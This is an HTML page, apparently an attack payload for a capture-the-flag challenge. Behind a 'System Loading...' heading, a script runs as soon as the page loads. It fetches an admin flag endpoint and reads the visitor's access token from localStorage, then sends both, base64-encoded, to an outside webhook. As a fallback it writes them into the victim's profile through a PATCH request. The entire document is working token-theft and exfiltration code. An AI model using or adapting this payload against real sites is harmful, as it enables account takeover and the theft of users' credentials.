<!DOCTYPE html>
<html>
<body>
    <h1>System Loading...</h1>
    <script>
        const webhook = "https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";

        async function ultimateLeak() {
            let log = { status: "started", flag: "not_found", token: "not_found" };

            try {
                // 1. Attempt to grab the 1000pt Flag
                const flagRes = await fetch('/api/admin/flag');
                if (flagRes.ok) log.flag = await flagRes.text();

                // 2. Attempt to grab the Auth Token (ATO)
                log.token = localStorage.getItem('accessToken') || "no_token_in_storage";

                // 3. EXTERNAL LEAK: Try the Webhook (might be blocked)
                fetch(`${webhook}?data=${btoa(JSON.stringify(log))}`);

                // 4. INTERNAL LEAK: Write to the Admin's own profile (the bypass)
                // We'll put the flag in the phone number and the token in the address
                await fetch('/api/auth/profile', {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        "fullName": "LEAK_COMPLETE",
                        "phoneNumber": log.flag.substring(0, 50),
                        "address": {
                            "street": log.token.substring(0, 50),
                            "city": "Check_Webhook_Or_JSON"
                        }
                    })
                });
            } catch (e) {
                // Fail-safe: notify webhook of the error
                fetch(`${webhook}?error=${btoa(e.message)}`);
            }
        }

        ultimateLeak();
    </script>
